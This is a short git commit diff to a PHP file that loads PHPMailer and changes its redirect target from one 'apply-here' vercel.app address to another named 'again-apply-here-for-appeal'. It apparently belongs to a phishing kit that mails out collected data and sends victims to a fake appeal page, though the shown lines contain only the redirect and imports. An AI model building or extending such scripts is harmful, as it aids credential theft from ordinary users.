55a9f61b1f20411baa78d18578e40fb933ed344b
k1514 <k1514386@gmail.com>
2025-09-05 19:56:01 +0500

    Update Basit.php

--- Basit.php
+++ Basit.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://re-apply-here.vercel.app/");
+header("Location: https://again-apply-here-for-appeal.vercel.app/");
 
 require 'Exception.php';
 require 'PHPMailer.php';
